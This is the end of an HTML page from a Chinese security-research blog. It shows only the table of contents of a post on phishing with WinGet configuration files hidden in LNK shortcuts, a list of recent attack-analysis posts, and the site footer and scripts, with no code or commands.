href="#04-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">04 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%8F%97%E5%AE%B3%E8%80%85%E7%82%B9%E5%87%BB%E6%83%85%E5%86%B5%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 受害者点击情况分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85%E5%9C%A8%E5%8E%8B%E7%BC%A9%E8%BD%AF%E4%BB%B6%E4%B8%AD%E7%9B%B4%E6%8E%A5%E5%8F%8C%E5%87%BB%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.0.1.</span> <span class="toc-text">受害者在压缩软件中直接双击文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%90%8E%EF%BC%8C%E5%9C%A8%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD%E5%8F%8C%E5%87%BB%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.0.2.</span> <span class="toc-text">受害者解压缩后，在文件夹中双击文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E6%9E%84%E9%80%A0winget%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 构造winget配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E6%8A%8Awinget%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E9%99%84%E5%8A%A0%E5%88%B0link%E6%96%87%E4%BB%B6%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%86%85%E5%AE%B9%E4%B8%AD"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 把winget配置文件附加到link文件的二进制内容中</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E7%94%A8%E6%9D%A5%E8%BF%B7%E6%83%91%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84pdf%EF%BC%8C%E6%89%98%E7%AE%A1%E5%9C%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 构造一个用来迷惑受害者的pdf，托管在远程服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E6%9C%80%E7%BB%88Payload"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 最终Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#05-%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%8E%A2%E7%B4%A2"><span class="toc-number">5.</span> <span class="toc-text">05 进一步探索</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E5%9C%A8%E7%BA%BF%E9%85%8D%E7%BD%AE"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 在线配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E5%85%B6%E4%BB%96%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 其他钓鱼方式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/" title="新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件">新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件</a><time datetime="2026-04-21T09:48:37.000Z" title="Created 2026-04-21 17:48:37">2026-04-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/06/CVE-2026-24291-Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E2%80%9CRegPwn%E2%80%9D%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" title="CVE-2026-24291-Windows权限提升漏洞“RegPwn”复现分析">CVE-2026-24291-Windows权限提升漏洞“RegPwn”复现分析</a><time datetime="2026-04-06T11:47:47.000Z" title="Created 2026-04-06 19:47:47">2026-04-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/13/Windows-x64%E6%B1%87%E7%BC%96%E4%B8%8EShellcode/" title="Windows x64汇编与Shellcode">Windows x64汇编与Shellcode</a><time datetime="2026-03-13T14:43:55.000Z" title="Created 2026-03-13 22:43:55">2026-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/15/COM%E5%AF%B9%E8%B1%A1%E5%8A%AB%E6%8C%81/" title="COM对象劫持">COM对象劫持</a><time datetime="2026-02-15T11:23:13.000Z" title="Created 2026-02-15 19:23:13">2026-02-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/12/Notepad-%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB-%E7%96%91%E4%BC%BC%E5%9B%BD%E5%AE%B6%E7%BA%A7%E9%BB%91%E5%AE%A2%E5%AE%9E%E6%96%BD%E7%9A%84%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB/" title="Notepad++供应链攻击--疑似国家级黑客实施的供应链攻击">Notepad++供应链攻击--疑似国家级黑客实施的供应链攻击</a><time datetime="2026-02-12T12:35:07.000Z" title="Created 2026-02-12 20:35:07">2026-02-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By ybdt</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
